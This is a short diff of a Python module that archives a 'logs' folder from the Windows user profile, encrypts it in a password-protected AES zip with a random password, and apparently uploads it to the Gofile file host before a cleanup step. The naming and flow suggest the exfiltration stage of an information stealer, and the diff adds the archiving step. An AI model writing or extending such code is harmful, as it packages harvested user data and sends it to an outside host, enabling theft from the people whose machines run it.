@@ -1,4 +1,4 @@
-from shutil import make_archive,rmtree
+from shutil import make_archive, rmtree
 from requests import post, get
 from os import chdir, remove, environ
 from os.path import basename, join
@@ -26,7 +26,7 @@ def upload_file_to_gofile(file_path):
         Log(e)
         return e
 
-def MakeZip(user):
+def MakeZip():
     dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
     pwd_str = ""
     name = ""
@@ -38,11 +38,14 @@ def MakeZip(user):
     
     try:
         chdir(environ["TEMP"])
-        with AESZipFile(f"{name}.zip", "w", compression=ZIP_STORED, encryption=WZ_AES) as logs:
+        make_archive("logs", "zip", join(environ["USERPROFILE"], config.pathToLogs))
+        result_path = join(environ["TEMP"], f"{name}.zip")
+
+        with AESZipFile(result_path, "w", compression=ZIP_STORED, encryption=WZ_AES) as logs:
             logs.setpassword(password)
             logs.write("logs.zip")
         remove("logs.zip")
-        return [join(environ["TEMP"], f"{name}.zip"), pwd_str]
+        return [result_path, pwd_str]
     except Exception as e:
         Log(f"MakeZip ---> {e}")
         return None
@@ -73,7 +76,7 @@ def Send(sendData, msgInfo) -> None:
     url = None
     Log("===========Conclusion===========")
 
-    zipInfo = MakeZip(user)
+    zipInfo = MakeZip()
     Clean(user)
     if not zipInfo: return None
 
